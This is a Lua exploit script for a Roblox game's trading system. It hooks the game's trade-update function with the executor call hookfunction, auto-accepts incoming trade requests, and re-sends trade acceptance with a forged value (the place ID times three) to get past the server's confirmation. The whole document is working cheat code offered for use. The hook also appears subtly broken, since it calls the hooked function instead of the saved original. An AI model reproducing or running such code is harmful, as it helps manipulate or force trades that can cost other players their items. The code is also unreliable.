local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TradeModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("TradeModule"))
local Trade = ReplicatedStorage:WaitForChild("Trade")

local TradeData 
	--{
	--	LastOffer = 123,
	--	Locked = false,
	--	Player1 = {
	--		Accepted = false,
	--		Offer = { {"VampireAxe", 1, "Weapons"} },
	--		Player = game.Players
	--	},
	--	Player2 = {
	--		Accepted = false,
	--		Offer = { {"VampireAxe", 1, "Weapons"} },
	--		Player = game.Players
	--	}
	--}

local UpdateTrade
UpdateTrade = hookfunction(TradeModule.UpdateTrade, function(data) 
	TradeData = data 
	return TradeModule.UpdateTrade(data)
end)

Trade.SendRequest.OnClientInvoke = function(Player)
	task.delay(.2, function()
		Trade.AcceptRequest:FireServer()
	end)
end

Trade.StartTrade.OnClientEvent:Connect(function(TradeData, Player2)

end)

Trade.AcceptTrade.OnClientEvent:Connect(function(Success)
	if not Success then
		Trade.AcceptTrade:FireServer(game.PlaceId * 3, TradeData.LastOffer)
	end
end)
